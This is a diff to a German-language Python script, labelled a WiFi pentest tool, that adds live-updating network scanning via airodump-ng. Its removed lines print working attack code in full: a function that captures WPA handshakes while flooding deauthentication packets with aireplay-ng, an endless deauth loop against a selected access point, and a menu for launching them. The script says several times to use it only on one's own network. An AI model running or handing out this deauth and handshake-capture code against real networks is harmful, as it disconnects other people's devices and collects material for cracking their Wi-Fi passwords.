@@ -156,64 +156,100 @@ def enable_monitor_mode(interface):
     sys.exit(1)
 
 def scan_networks(mon_interface):
-    print(f"--- Scanne {SCAN_DURATION} Sekunden...")
+    print(f"--- Scanne {SCAN_DURATION} Sekunden... (Enter = sofort anzeigen)")
     prefix = "scan"
+
     for f in glob.glob(f"{prefix}*"):
         try: os.remove(f)
         except: pass
-    
+
     try:
-        run_cmd(["timeout", str(SCAN_DURATION + 5), "airodump-ng", mon_interface, "-w", prefix, "--output-format", "csv"], check=True)
+        proc = subprocess.Popen(
+            ["airodump-ng", mon_interface, "-w", prefix, "--output-format", "csv"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
     except Exception as e:
         log(f"FEHLER beim Scan: {e}")
         print("Scan konnte nicht gestartet werden.")
         return []
-    
+
     csv_file = f"{prefix}-01.csv"
-    if not os.path.exists(csv_file):
-        print("FEHLER: Scan-Datei (CSV) wurde nicht erstellt.")
-        log("Keine CSV-Datei nach Scan")
-        return []
-    
     networks = []
+    start_time = time.time()
+
     try:
-        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
-            lines = f.readlines()
-        in_ap = False
-        for line in lines:
-            line = line.strip()
-            if line.startswith("BSSID,"):
-                in_ap = True
-                continue
-            if in_ap and "Station MAC" in line:
+        while True:
+            # Enter gedrückt?
+            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                input()
                 break
-            if in_ap and line:
-                fields = [x.strip() for x in line.split(",")]
-                if len(fields) >= 14 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', fields[0]):
-                    networks.append({
-                        "bssid": fields[0],
-                        "channel": fields[3],
-                        "essid": fields[13].strip('"') if len(fields) > 13 else "<versteckt>",
-                        "privacy": fields[5],
-                        "power": fields[8]
-                    })
-    except Exception as e:
-        log(f"FEHLER beim Parsen der CSV: {e}")
-        print("Fehler beim Lesen der Scan-Ergebnisse.")
-        return []
-    
-    networks.sort(key=lambda x: int(x.get("power", "-100")) if str(x.get("power", "")).lstrip('-').isdigit() else -100, reverse=True)
+
+            # Zeit abgelaufen?
+            if time.time() - start_time > SCAN_DURATION:
+                break
+
+            # CSV auslesen (wenn vorhanden)
+            if os.path.exists(csv_file):
+                try:
+                    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
+                        lines = f.readlines()
+
+                    temp_networks = []
+                    in_ap = False
+
+                    for line in lines:
+                        line = line.strip()
+                        if line.startswith("BSSID,"):
+                            in_ap = True
+                            continue
+                        if in_ap and "Station MAC" in line:
+                            break
+                        if in_ap and line:
+                            fields = [x.strip() for x in line.split(",")]
+                            if len(fields) >= 14 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', fields[0]):
+                                temp_networks.append({
+                                    "bssid": fields[0],
+                                    "channel": fields[3],
+                                    "essid": fields[13].strip('"') if len(fields) > 13 else "<versteckt>",
+                                    "privacy": fields[5],
+                                    "power": fields[8]
+                                })
+
+                    # sortieren
+                    temp_networks.sort(
+                        key=lambda x: int(x.get("power", "-100")) if str(x.get("power", "")).lstrip('-').isdigit() else -100,
+                        reverse=True
+                    )
+
+                    networks = temp_networks
+
+                    # Anzeige (nur SSID + Nummer)
+                    os.system("clear")
+                    print("GEFUNDENE NETZWERKE:\n")
+                    for i, n in enumerate(networks, 1):
+                        print(f"{i:2d}. {n['essid']}")
+
+                    print("\n[Enter = sofort auswählen]")
+
+                except:
+                    pass
+
+            time.sleep(1)
+
+    finally:
+        proc.terminate()
+
     return networks
+
 
 def print_networks(networks):
     if not networks:
         return
-    print("\n" + "="*90)
-    print("GEFUNDENE NETZWERKE (nach Signalstärke sortiert):")
-    print("="*90)
+    print("\nGEFUNDENE NETZWERKE:\n")
     for i, n in enumerate(networks, 1):
-        print(f"{i:2d}. SSID: {n['essid']:<32} | BSSID: {n['bssid']} | Kanal: {n['channel']:>2} | Signal: {n['power']:>4} | {n['privacy']}")
-    print("="*90)
+        print(f"{i:2d}. {n['essid']}")
+
 
 def select_network(networks):
     while True:
@@ -224,167 +260,3 @@ def select_network(networks):
             print("Ungültige Nummer!")
         except ValueError:
             print("Bitte eine Zahl eingeben!")
-
-def safe_terminate(proc, name="Prozess"):
-    """Sauberes Beenden mit terminate → wait → kill"""
-    if proc.poll() is None:
-        proc.terminate()
-        try:
-            proc.wait(timeout=8)
-            log(f"{name} sauber beendet (terminate)")
-        except subprocess.TimeoutExpired:
-            proc.kill()
-            log(f"{name} mit kill beendet")
-        except Exception as e:
-            log(f"Fehler beim Beenden von {name}: {e}")
-
-def get_capture_file(prefix):
-    """Sichere Capture-Datei-Ermittlung"""
-    cap_files = glob.glob(f"{prefix}-*.cap")
-    if not cap_files:
-        print("FEHLER: Keine Capture-Datei erstellt.")
-        log(f"Keine .cap-Datei für Prefix {prefix}")
-        return None
-    cap_file = max(cap_files, key=os.path.getctime)
-    print(f"Capture-Datei erstellt: {cap_file}")
-    log(f"Capture-Datei: {cap_file}")
-    return cap_file
-
-def passive_capture(mon_interface, selected):
-    prefix = "passive_capture"
-    for f in glob.glob(f"{prefix}*"): 
-        try: os.remove(f)
-        except: pass
-    print(f"\n--- Passives Capture für {selected['essid']}...")
-    proc = subprocess.Popen(["airodump-ng", "-c", selected["channel"], "--bssid", selected["bssid"], "-w", prefix, mon_interface])
-    input("ENTER zum Beenden...")
-    safe_terminate(proc, "airodump-ng")
-    return get_capture_file(prefix)
-
-def deauth_handshake(mon_interface, selected):
-    print(f"\n--- Starte Capture + Deauth für Handshake ({selected['essid']})")
-    print("   Nur auf eigenem Netzwerk verwenden!")
-    prefix = "handshake_capture"
-    for f in glob.glob(f"{prefix}*"): 
-        try: os.remove(f)
-        except: pass
-    
-    airodump = subprocess.Popen([
-        "airodump-ng", "-c", selected["channel"], "--bssid", selected["bssid"], "-w", prefix, mon_interface
-    ])
-    
-    def deauth_loop():
-        for i in range(DEAUTH_BURSTS):
-            print(f"   Deauth-Burst {i+1}/{DEAUTH_BURSTS}...")
-            try:
-                subprocess.run(["aireplay-ng", "-0", str(DEAUTH_PACKETS), "-a", selected["bssid"], mon_interface],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
-            except Exception as e:
-                log(f"Fehler in Deauth-Burst: {e}")
-            time.sleep(3)
-    
-    threading.Thread(target=deauth_loop, daemon=True).start()
-    
-    print("Warte auf WPA handshake...")
-    input("ENTER zum Beenden...")
-    
-    safe_terminate(airodump, "airodump-ng")
-    subprocess.run(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
-    return get_capture_file(prefix)
-
-def general_monitoring(mon_interface):
-    print("\n--- Allgemeines Monitoring (ENTER zum Stoppen)...")
-    proc = subprocess.Popen(["airodump-ng", mon_interface])
-    input()
-    safe_terminate(proc, "airodump-ng")
-
-def only_deauth(mon_interface, selected):
-    print("--- Nur Deauth-Angriff (ENTER zum Stoppen)...")
-    def deauth_loop():
-        while True:
-            try:
-                subprocess.run(["aireplay-ng", "-0", "8", "-a", selected["bssid"], mon_interface],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except:
-                pass
-            time.sleep(2)
-    t = threading.Thread(target=deauth_loop, daemon=True)
-    t.start()
-    input()
-    subprocess.run(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-def restore(interface, mon_interface):
-    print("\n--- System wird wiederhergestellt...")
-    try:
-        run_cmd(["airmon-ng", "stop", mon_interface], check=False)
-        time.sleep(2)
-        run_cmd(["ip", "link", "set", interface, "down"], check=False)
-        run_cmd(["iwconfig", interface, "mode", "managed"], check=False)
-        run_cmd(["ip", "link", "set", interface, "up"], check=False)
-        run_cmd(["systemctl", "restart", "NetworkManager"], check=False)
-        log("System-Restore durchgeführt")
-        print("Restore abgeschlossen.")
-    except Exception as e:
-        log(f"Restore-Fehler: {e}")
-        print("Restore teilweise fehlgeschlagen – prüfe manuell mit iwconfig.")
-
-# ====================== HAUPTPROGRAMM ======================
-if __name__ == "__main__":
-    start_time = datetime.now()
-    is_root()
-    log("=== WiFi Pentest Tool gestartet ===")
-    log(f"Startzeit: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
-    
-    check_required_tools()
-    kill_interfering_processes()
-    
-    interface = select_interface()
-    mon_interface = enable_monitor_mode(interface)
-    
-    networks = scan_networks(mon_interface)
-    if not networks:
-        print("Keine Netzwerke gefunden.")
-        restore(interface, mon_interface)
-        log("Skript beendet: Keine Netzwerke")
-        sys.exit(1)
-    
-    print_networks(networks)
-    selected = select_network(networks)
-    
-    print("\n" + "="*60)
-    print("HAUPTMENÜ")
-    print("="*60)
-    print("1 = Passives Capture")
-    print("2 = Allgemeines Monitoring")
-    print("3 = Handshake mit Deauth (aktiv)")
-    print("4 = Nur Deauth-Angriff")
-    print("0 = Beenden")
-    
-    while True:
-        try:
-            choice = int(input("\nAuswahl: "))
-            if choice in [0,1,2,3,4]:
-                break
-        except:
-            pass
-    
-    cap_file = None
-    if choice == 1:
-        cap_file = passive_capture(mon_interface, selected)
-    elif choice == 2:
-        general_monitoring(mon_interface)
-    elif choice == 3:
-        cap_file = deauth_handshake(mon_interface, selected)
-    elif choice == 4:
-        only_deauth(mon_interface, selected)
-    elif choice == 0:
-        pass
-    
-    if cap_file:
-        print(f"\nFinale Capture-Datei: {cap_file}")
-    
-    restore(interface, mon_interface)
-    log("Skript erfolgreich beendet")
-    print("\nTool sauber beendet. Nur auf eigenen Netzwerken verwenden!")
-    print(f"Logdatei: {LOGFILE}")
